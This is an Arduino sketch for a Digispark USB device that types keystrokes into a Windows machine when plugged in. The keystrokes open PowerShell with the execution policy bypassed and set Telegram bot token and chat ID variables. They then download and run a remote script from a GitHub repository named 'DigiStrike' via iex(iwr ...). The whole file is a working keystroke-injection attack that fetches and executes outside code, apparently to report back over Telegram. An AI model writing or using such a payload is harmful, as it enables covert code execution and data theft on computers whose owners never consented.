#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -ep bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print("$env:TK='Your bot tokken'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print("$env:CI='-Chat Id'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/Esther7171/-DigiStrike/main/scripts/void.ps1' -UseBasicParsing).Content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
